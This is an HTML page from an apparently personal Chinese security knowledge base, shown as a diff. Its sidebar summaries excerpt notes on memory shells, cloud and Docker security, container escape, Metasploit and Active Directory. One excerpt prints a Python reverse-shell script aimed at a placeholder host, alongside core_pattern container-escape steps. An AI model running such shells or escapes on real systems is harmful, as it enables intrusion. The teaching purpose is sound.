@@ -1,0 +1,1459 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>数据结构之图 | mrlxl的知识库</title>
+<script>
+  (function() {
+    const savedTheme = localStorage.getItem('theme');
+    const html = document.documentElement;
+    if (savedTheme) {
+      html.setAttribute('data-theme', savedTheme);
+    } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+      html.setAttribute('data-theme', 'dark');
+    }
+  })();
+</script>
+
+      <link rel="stylesheet" href="../../../../css/main.min.1b811b24e25dcc4d4e5cab50b3b6089531edce29a8d36035967c1f4af823ee08.css" integrity="sha256-G4EbJOJdzE1OXKtQs7YIlTHtzimo02A1lnwfSvgj7gg=" crossorigin="anonymous">
+
+
+        <script src="../../../../js/main.c7c382a34629504a0438bf6064d168a2df4a02e88159bc8148fc2bd4f2e54d01.js" integrity="sha256-x8OCo0YpUEoEOL9gZNFoot9KAuiBWbyBSPwr1PLlTQE=" crossorigin="anonymous"></script>
+
+
+</head>
+<body>
+  <header>
+    <div class="header-inner">
+  
+  <div class="header-left">
+    
+    <img src="../../../../avatar.jpg" alt="Avatar" class="header-avatar">
+    
+    
+    <a href="../../../../" class="header-title">mrlxl的知识库</a>
+    
+    
+    <a href="../../../../" class="header-home-btn" title="首页">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+        <polyline points="9 22 9 12 15 12 15 22"></polyline>
+      </svg>
+    </a>
+  </div>
+
+  
+  <div class="header-right">
+    
+    <a href="https://mrlxl.cn" target="_blank" class="header-about-btn">关于我</a>
+
+    
+    <button id="mobile-search-trigger" class="mobile-search-btn">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"></circle>
+        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+      </svg>
+    </button>
+
+    
+    <div class="theme-switch-wrapper">
+      <label class="theme-switch" for="checkbox">
+        <input type="checkbox" id="checkbox" />
+        <div class="slider round">
+          
+          <svg class="icon-moon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+          </svg>
+          
+          <svg class="icon-sun" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="5"></circle>
+            <line x1="12" y1="1" x2="12" y2="3"></line>
+            <line x1="12" y1="21" x2="12" y2="23"></line>
+            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+            <line x1="1" y1="12" x2="3" y2="12"></line>
+            <line x1="21" y1="12" x2="23" y2="12"></line>
+            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+          </svg>
+        </div>
+      </label>
+      <script>
+        
+        (function() {
+          const html = document.documentElement;
+          const checkbox = document.getElementById('checkbox');
+          if (html.getAttribute('data-theme') === 'dark') {
+            checkbox.checked = true;
+          }
+        })();
+      </script>
+    </div>
+  </div>
+</div>
+
+  </header>
+  <main>
+    
+<div class="container">
+  <div class="sidebar-left tree">
+  <div class="search-trigger" id="search-trigger">
+    <span class="search-icon">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M15.5 14H14.71L14.43 13.73C15.41 12.59 16 11.11 16 9.5C16 5.91 13.09 3 9.5 3C5.91 3 3 5.91 3 9.5C3 13.09 5.91 16 9.5 16C11.11 16 12.59 15.41 13.73 14.43L14 14.71V15.5L19 20.49L20.49 19L15.5 14ZM9.5 14C7.01 14 5 11.99 5 9.5C5 7.01 7.01 5 9.5 5C11.99 5 14 7.01 14 9.5C14 11.99 11.99 14 9.5 14Z" fill="currentColor"/>
+      </svg>
+    </span>
+    <span class="search-text">搜索文章...</span>
+  </div>
+  <h3>文档</h3>
+  
+  
+
+  
+    
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>web安全进阶</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E5%AE%9E%E6%88%98%E4%B8%8E%E6%9F%A5%E6%9D%80/" class="article-link" data-summary="内存马原理、实战与查杀 引言 我们在漏洞挖掘的时候经常看见大牛们发现一个文件上传漏洞时，上传的不是我们熟知的.php文件，而是.jsp文件。这其实利用的不是我们开始学的时候接触的webshell,而是memshell(内存马)。这篇文章将从基础原理开始，依次介绍Servlet内存马，Spring内存马，Agent内存马，Shiro内存马使用以及内存马的检测与查杀。
+一. Java Web 应用的三大组件 想要理解最常见的三种内存马的类型，那么一定要了解Java Web 应用的三大组件 Servlet，Filter，Listener，下面我将结合工程实例具体介绍：
+1.1 Servlet Servlet 是运行在 Web 容器中的 Java 程序，用于接收客户端请求并生成响应，是 Java Web 中处理业务逻辑的核心组件。
+结合大家都知道的当前已经成为主流的 Spring Boot 我们可能对 Servlet 感到更加熟悉一点，但是不论是 Spring MVC 还是 Spring Boot，本质上都是建立在 Servlet 规范之上的封装，它们内部都通过一个或多个 Servlet 来接收并分发 HTTP 请求。 下图是 Java Web 发展史的“标准主线” 一个 Servlet 工程 = Tomcat &#43; Servlet API &#43; 你写的 Servlet 类 &#43; 映射配置，在工程里代码层如何开发一个 Servlet 完整流程如下： Servlet 和 jsp 的关系：JSP(java servlet page) 是一种以页面为中心的 Servlet 编写方式，最终都会被编译成 Servlet 执行。 当你第一次访问一个 .jsp 文件时，Tomcat 会做这几件事：
+">内存马原理，实战与查杀</a>
+        
+      </div>
+    </li>
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>API安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>云安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="云原生基础知识 正式开始云原生安全的学习，首先了解一下相关的基础知识
+常见名词 记录一些常见的专业术语的意思
+容器 这玩意打CTF的应该都比较熟悉
+Docker 是一个开放源代码软件，是一个开放平台，用于开发应用、交付（shipping）应用、运行应用。Docker允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度
+Docker 容器与虚拟机类似，但二者在原理上不同:
+容器是将操作系统层虚拟化 虚拟机是虚拟化硬件 按照上面的比较，可以知道容器能更便携高效地利用服务器
+接下来一下Docker官方给出的架构图：
+可以看见里面包括了Docker客户端、Docker容器所在宿主机、Docker镜像仓库三部分
+而宿主机包括了Docker守护进程、本地容器、本地镜像，Docker守护进程Dockerd的作用是侦听Docker API请求和管理Docker对象
+容器编排 容器编排（Container Orchestration）是指自动化容器的部署、管理、扩展和联网，容器编排可以为需要部署和管理成百上千个 Linux 容器和主机的企业提供便利
+常见的容器编排工具方案有 Kubernetes、Docker Swarm 和 Apache Mesos 等
+无服务 无服务（serverless）是一种云原生开发模型，可使开发人员专注构建和运行应用，简单来说，就是开发者不用去管服务器只负责开发就行
+无服务计算产品通常被分为两类，分别是后端即服务（BaaS）和函数即服务（FaaS），其中 FaaS 是 Serverless 的主要实现方式，FaaS 的相关产品主要有 AWS 的 Lambda、Azure 的 Functions Serverless Compute、GCP 的 Firebase Cloud Functions、阿里云的 Function Compute 等
+微服务 微服务（Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信
+服务网格 服务网格（Service Mesh）用于控制应用的不同部分之间如何共享数据，服务网格内置于应用程序中的专用基础架构层，这个可见的基础架构层可以记录应用的不同部分是否能正常交互
+云原生安全 云原生 云 ：运行在云服务器上 原生 ：将应用运行到云上，充分的利用云自身的特点，比如弹性和分布式优势（且业务按照云来设计，而不是简单迁移） 云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API
+云原生安全 云原生安全至少包含了微服务安全、无服务安全、编排平台安全、服务网格安全、容器安全、宿主机安全等等。
+根据云原生环境的构成，面向云原生环境的安全体系可以概括为以下三个层面：
+容器安全 编排系统安全 云原生应用安全：包括了微服务、无服务、服务网格、零信任体系、API 安全等等 另外除了这些和云原生环境相关的技术之外，云原生安全还包含了一些传统安全的内容，比如宿主机的安全等等。
+">云原生基础知识</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%AD%A6%E4%B9%A0/" class="article-link" data-summary="云服务学习 云服务就是云上的服务，比如从云厂商（AWS、阿里云）买来的服务
+国内云厂商：
+阿里云 腾讯云 华为云 天翼云 Ucloud 金山云 &amp;amp;hellip;&amp;amp;hellip; 国外云厂商：
+AWS GCP Azure &amp;amp;hellip;&amp;amp;hellip; 每个云厂商对云服务的叫法不同，这里以AWS的为例：
+S3对象存储（Simple Storage Service），可以简单理解为网盘，略有区别 EC2弹性计算服务（Elastic Computer Cloud），简单理解为云上的虚拟机 RDS云数据库（Relational Database Service），简单理解为云上数据库 IAM身份管理和访问管理（Identity and Access Management），简单理解为云控制台上的一套身份管理服务，可以用来管理每个子账号的权限 综上来看，其实可以简单看作一些本地的功能/服务放到了云上，那么就会产生对应的风险，值得研究
+在下文的案例图片中，笔者可能会更多用国内厂商（比如aliyun）进行举例，漏洞实例使用TerraformGoat靶场进行演示
+学习顺序参考https://wiki.teamssix.com/
+对象存储 对象存储（Object-Based Storage），也可以叫做面向对象的存储，现在也有不少厂商直接把它叫做云存储，很经典的就是Amazon S3 (Simple Storage Service) 简单存储服务，是 Amazon 的公开云存储服务，与之对应的协议被称为 S3 协议，目前 S3 协议已经被视为公认的行业标准协议，因此目前国内主流的对象存储厂商基本上都会支持 S3 协议
+Amazon S3标准中，对对象存储中可以有多个桶（Bucket），而对象（object）存放在桶里，对象包含三个key、Data、Metadata部分：
+Key指存储桶中的唯一标识符，例如一个 URL 为：https://yuy0ung.s3.ap-northeast-2.amazonaws.com/d0g3，这里的 yuy0ung 是存储桶 Bucket 的名称，/d0g3 就是 Key Data很好理解，就是存储的数据本体 Metadata意味元数据，可以简单理解为数据的标签、描述之类的信息（区别于传统的文件存储，在传统的文件存储中这类信息是直接封装在文件里的，而云上有了元数据的存在，可以大大的加快对象的排序、分类和查找） 操作使用Amazon S3的方式大致如下：
+AWS 控制台操作 AWS 命令行工具操作 AWS SDK 操作 REST API 操作，通过 REST API，可以使用 HTTP 请求创建、提取和删除存储桶和对象 接下来记录S3相关攻击手法
+">云服务学习</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/" class="article-link" data-summary="识别虚拟机、Docker和K8s集群环境 一、基础 随着云原生应用不断普及，在我们getshell之后，我们还需要判断该shell是否处于虚拟环境中，并判断该虚拟环境的类型，通常情况下，shell的虚拟环境可能有如下三个类型：
+虚拟机 虚拟机是指在一台物理服务器上运行的多个虚拟主机实例，每个虚拟主机实例都拥有自己的环境和资源，通常用于提供Web托管服务
+Docker Docker是一种虚拟化技术，利用容器化的方式将应用程序及其依赖项打包成独立、轻量级的环境，实现快速部署、高效运行和跨平台运行的功能
+K8s Kubernetes（通常简写为K8s）是一个开源的容器编排平台，通过自动化部署、扩展和管理容器化应用，实现高可用性、弹性和灵活性。它提供了集群管理、服务发现、负载均衡等功能，让用户可以更轻松地管理容器化应用的生命周期
+二、思路 如果shell处于虚拟机、Docker或K8s集群环境中，我们需要对环境进行识别，并采取针对性的措施，比如：
+虚拟机：通常考虑横向移动来扩大攻击效果
+Docker：通常先进行容器逃逸，再进行内网横向移动
+K8s：通常先尝试接管集群，以获取对容器和集群资源的完全控制
+三、识别 首先判断当前shell是否采用了虚拟化技术：
+systemd-detect-virt	#识别系统虚拟机（VM）、容器还是裸机上运行 在确认采用了虚拟化技术后，常有如下检测方法可以快速识别当前所处环境类型
+查看主机名和进程 容器的主机名默认随机生成的字符串，PID1非系统进程，可初步判断当前为容器环境
+hostname	#查看主机名 ps aux	#显示系统上所有用户的详细进程信息 通过利用cgroup信息的差异 通过查看cgroup信息，可以判断当前环是否是虚拟机、Docker容器或K8s集群:
+cat /proc/1/cgroup	#用于查看进程ID为1的系统进程（通常是Init进程）所属的cgroup信息，即用于控制和管理进程资源使用的容器技术 也可以针对性的查找关键词，例如针对Docker字符串：
+grep &amp;amp;#39;docker&amp;amp;#39; /proc/1/cgroup	#查找是否存在‘Docker’字符串 检查根目录下.dockerenv文件
+通过判断根目录下的.dockerenv文件是否存在，确认当前环是否为容器环境:
+ls -alh/dockerenv	#列出/dockerenv目录下的所有文件和目录，并显示详细信息以及人类可读的文件大小 通过检查挂载信息
+通过检查挂载信息，推测当前环境是虚拟机、Docker容器还是K8s集群:
+mount lgrep &amp;amp;#39;/type&amp;amp;#39;	#从当前系统中列出所有已挂载的文件系统，并使用grep命令筛选出包含/type路径的挂载信息 查看硬盘信息
+通过查看硬盘信息，推断当前环境是否为容器环境:
+fdisk -l #列出系统上所有磁盘的分区信息 获取当前环境的文件系统和挂载点信息
+获取当前环境的文件系统和挂载点信息，用来判断是否容器环境:
+df -h	#显示文件系统的磁盘使用情况和挂载点信息 通过了解环境变量包含的信息
+通过检查环境变量，了解特定环境的信息:
+env #显示当前系统环境中的所有环境变量 四、反制 对于防守者而言，通过了解攻击者在云原生环境中可能采取的这些信息探测行为，可以建立有效的告警机制，以便及早发现潜在的攻击行为
+">识别虚拟机、Docker和K8s集群环境</a>
+        
+      </div>
+    </li>
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>docker安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/" class="article-link" data-summary="Docker安全概览 前面的文章已经简单介绍了docker容器相关概念，docker的使用对于接触过ctf出题的人来说还是相对熟悉了，这里也不做过多介绍，接下来从安全的角度来分析一下docker
+Docker面临的风险 镜像风险 镜像的内容是由用户进行配置的，所以有可能造成一些安全问题
+不安全的第三方组件 比如在镜像中引入了一些具有严重nday的组件，毫无疑问，这个镜像也就存在漏洞了
+不安全的镜像 类似供应链攻击，在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了
+敏感信息泄漏 如果在镜像开发完毕后没有删除自己配置的api key、AK/SK等，那么如果别人获取到该镜像就可能造成敏感信息泄漏
+活动中的容器风险 容器在运行时也有一些能够用户自定义的配置，这些配置不当同样可能造成风险
+不安全的容器应用 比如映射出来的端口的服务存在漏洞，那么自然会导致风险
+不受限制的资源共享 容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险
+不安全的配置/挂载 正常来说，容器有两大隔离机制：
+linux命名空间：实现文件系统、网络、进程、主机名等方面的隔离 linux控制组：实现CPU、内存、硬盘等方面的隔离 而配置不当会导致容器本身隔离机制失效：
+&amp;amp;ndash;privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破 &amp;amp;ndash;net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破 &amp;amp;ndash;pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破 &amp;amp;ndash;volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破 容器管理程序接口风险 Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket
+UNIX socket 风险主要在于Docker守护进程默认以宿主机的root权限运行，说到这里其实熟悉后渗透的师傅都能想到，可以利用这一点进行提权，除此之外我们还可以利用这点进行容器逃逸，这类风险有两个利用场景
+普通用户被加到Docker用户组内
+如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限
+Unix socket挂载到容器内部
+有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，渗透测试人员就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限
+">Docker安全概览</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/" class="article-link" data-summary="Docker逃逸手法大全 Docker相关安全风险更多集中在Docker逃逸方面
+和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件
+判断是否为容器环境 在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：快速识别虚拟主机、Docker和K8s集群环境
+不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：
+ls -al /.dockerenv 确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check
+挂载宿主机procfs逃逸 基础概念 procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件
+user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID
+而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：
+从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行
+环境搭建 创建容器并挂载/proc目录：
+docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 搭建完毕
+信息搜集 如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：
+find / -name core_pattern 漏洞利用 找到当前容器在主机下的绝对路径：
+cat /proc/mounts | xargs -d &amp;amp;#39;,&amp;amp;#39; -n 1 | grep workdir 可以看到绝对路径为/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work
+接下来安装vim和gcc：
+apt-get update -y &amp;amp;amp;&amp;amp;amp; apt-get install vim gcc -y 然后创建一个python脚本用于反弹shell：
+#!/usr/bin/python3 import os import pty import socket lhost = &amp;amp;#34;xx.xx.xx.xx&amp;amp;#34; lport = 7777 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(&amp;amp;#34;HISTFILE&amp;amp;#34;, &amp;amp;#39;/dev/null&amp;amp;#39;) pty.spawn(&amp;amp;#34;/bin/bash&amp;amp;#34;) # os.remove(&amp;amp;#39;/tmp/.shell.py&amp;amp;#39;) s.close() if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: main() 赋予执行权限：
+">Docker逃逸手法大全</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>反序列化</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>后渗透</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>内网渗透</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/msfcs%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="article-link" data-summary="MSF&amp;amp;amp;CS介绍与使用 免责声明：本文所有内容仅供学习交流，请勿用于违法活动
+Metasploit Framework（MSF） Metasploit是ruby语言开发的一个基于命令行操作的渗透测试框架，我们可以查找，利用和验证漏洞，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程
+一、msf体系框架 msf的整体框架如下：
+我们重点关注模块部分
+模块组织按照不同的用途分为7种类型的模块（Modules）：
+辅助模块（Aux)：负责信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能 渗透攻击模块（Exploits)：利用系统漏洞进行攻击，里面有每一个具体漏洞的攻击方法 后渗透攻击模块（Post)：在取得目标系统远程控制权限后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作 攻击载荷模块（payloads)：成功exploit之后，真正在目标系统执行的代码或指令 编码器模块（Encoders)：主要对payload进行加密，最终达到躲避AntiVirus检查的目的 空指令模块（Nops)：主要作用是提高payload稳定性及维持大小 免杀模块(Evasion)：可以用来创建木马文件 二、Metasploit基本使用 kali中自带了msf，可以直接使用
+Metasploit启动 msf有一个用于存储信息收集数据的关系型数据库Postgresql，可以自主选择是否开启
+msf有三种启动方式：
+先启动Postgresql数据库，再启动Metasploit
+service postgresql start msfconsole 不启动数据库，直接启动Metasploit
+msfconsole 启动Postgresql的同时启动Metasploit
+msfdb run 也可以直接在kali左上角工具点击启动，实际上是自动执行了命令：
+sudo msfdb init &amp;amp;amp;&amp;amp;amp; msfconsole 由于Postgresql数据库的默认端口为5432，所以可以查看该端口来判断是否开启Postgresql数据库：
+netstat -pantu | grep 5432 Metasploit常用命令 在msfconsole中，输入help可以看见各种命令的介绍
+show展示 用于展示可用模块，有效参数是：all，encoders，nops，exploits，payloads，auxiliary, post，plugins，info，options
+展示模块时，每个模块都会有一个名为Rank的字段，该列代表该模块的可靠性
+Rank 的值可以是下面的表格中的其中之一，按照可靠性降序排列
+Ranking Description ExcellentRanking 漏洞利用程序绝对不会使目标服务崩溃，就像 SQL 注入，命令执行，远程文件包含，本地文件包含等等。除非有特殊情况，典型的内存破坏利用程序不可以被评估为该级别。（WMF Escape()） GreatRanking 该漏洞利用程序有一个默认的目标系统，并且可以自动检测适当的目标系统，或者在目标服务的版本检查之后可以返回到一个特定于应用的返回地址。（译者注：有些二进制的漏洞利用成功后，需要特别设置 Shell 退出后的返回地址，否则当 Shell 结束后，目标服务器会崩溃掉。） GoodRanking 该漏洞利用程序有一个默认目标系统，并且是这种类型软件的“常见情况”（英文，桌面应用程序的Windows 7，服务器的2012等常用） NormalRanking 该漏洞利用程序是可靠的，但是依赖于特定的版本，并且不能或者不能可靠地自动检测。 AverageRanking 该漏洞利用程序不可靠或者难以利用。 LowRanking 对于通用的平台而言，该漏洞利用程序几乎不能利用（或者低于 50% 的利用成功率） ManualRanking 该漏洞利用程序不稳定或者难以利用并且基于拒绝服务（DOS）。如果一个模块只有在用户特别配置该模块的时候才会被用到，否则该模块不会被使用到，那么也可以评为该等级。（例如：exploit/unix/webapp/php_eval） search搜索 已知一个漏洞，我想知道Metasploit里面是否有相关的模块，就可以用search进行搜索
+">MSF&amp;CS介绍与使用</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="内网渗透-AD域基础知识 简介 内网也指局域网，是一个封闭的网络空间
+内网渗透（intranet exploitation）是对目标服务器getshell后，通过一系列技术手段对其所处的内网环境进行渗透，最终获取内网其他主机的权限的过程，这些通常涉及以下技术：
+内网信息收集 内网代理 权限提升 横向移动 &amp;amp;hellip;&amp;amp;hellip; 基本概念 工作组（work group） 分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为WORKGROUP
+简单来说，就是将不同的计算机按照功能或部门分别置于不同的组，适用于网络中计算机不多、资产规模较小、对安全管理控制要求不严格的情况，这是一种松散的资源管理模式，任何人都可以在局域网中创建新的工作任务而无需管理员同意，换言之，处于同一工作组中的主机彼此间地位平等，不存在额外关联或管理关系，对于此类情况，在内网渗透时需要逐个渗透与控制
+在局域网内，计算机默认都是按照工作组的方式进行资源管理的
+优点： 方便管理和维护 资源分配方便和灵活 缺点： 缺乏集中管理与控制的机制 没有集中的统一账户管理 只适合小规模用户的使用 域（domain） 分辨：在命令提示符界面执行systeminfo，回显结果的“域”信息为类似域名格式，由“.”连接的字符串
+当组织中网络规模越来越大时，需要统一的管理和集中的身份验证，并能为用户提供更加方便地的网络资源搜索和使用方式时，就需要放弃工作组而使用域
+域是一种比工作组更高级的的计算机资源管理模式，在域环境中，所有用户账户、用户组、计算机、打印机和其他安全主体都在一个或多个域控制器的中央数据库中注册；当域用户想访问域中的资源时，必须通过域控制器集中进行身份验证，通过身份验证的域用户在域中的身份决定了域用户对域中资源的访问权限
+在域环境中，域管理员用户在域中具有最高访问权限和最高管理权限，在渗透过程中，获取域管理员相关权限往往可以控制整个域控
+单域
+指网络环境中只有一个域
+父域和子域
+某些情况下，需要在一个域中分出多个域，被划分的域称为父域，划分出来的域被称为子域，每个子域都拥有自己的安全策略，在有信任的情况下，父域可以访问子域
+从域名上看，子域是域名中的一个段，用“.”进行域名分割，一个“.”代表域名的一个层级
+域树
+域树是多个域通过建立信任关系组成的一个域集合
+在域树中，所有的域共享同一表结构和配置，所有域名形成一个连续的名字空间，该命名空间具有连续性，域名层次越深，级别越低
+在域树中，域管理员只能管理本域，不能访问或管理其他域，如果两个域之间要互相访问，就需要建立信任关系（trust relation）
+域林
+指由一个或多个没有形成连续名字空间的域树通过建立信任关系组成的域树集合，域林中所有域树共享同一个表结构、配置和全局目录
